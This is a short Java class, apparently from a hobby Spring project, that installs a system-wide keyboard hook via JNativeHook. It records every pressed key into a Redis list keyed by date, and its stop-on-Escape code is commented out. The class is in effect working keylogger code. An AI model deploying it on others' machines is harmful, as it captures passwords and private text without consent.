package com.example.listenersysteminput.listener;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.springframework.data.redis.core.StringRedisTemplate;

import java.time.LocalDate;

/**
 * 监听键盘键入
 */
public class GlobalKeyListenerExample implements NativeKeyListener {

    private static StringRedisTemplate stringRedisTemplate;

    public static StringRedisTemplate getStringRedisTemplate() {
        return stringRedisTemplate;
    }

    public static void setStringRedisTemplate(StringRedisTemplate stringRedisTemplate) {
        GlobalKeyListenerExample.stringRedisTemplate = stringRedisTemplate;
    }

    public GlobalKeyListenerExample(StringRedisTemplate stringRedisTemplate) {
        setStringRedisTemplate(stringRedisTemplate);
    }


    /**
     * 键入事件
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key 按下: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        //写入redis
        stringRedisTemplate.opsForList().rightPush(LocalDate.now().toString(), NativeKeyEvent.getKeyText(e.getKeyCode()));
        //这段话的意思是: 如果按下 esc 则停止监听（注销本机钩子）
//        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
//            try {
//                GlobalScreen.unregisterNativeHook();
//            } catch (NativeHookException nativeHookException) {
//                nativeHookException.printStackTrace();
//            }
//        }
    }

    /**
     * 松开事件
     */
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
//        System.out.println("Key 松开: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }


    /**
     * 不知道???, 以后再说
     */
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
//        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }

}
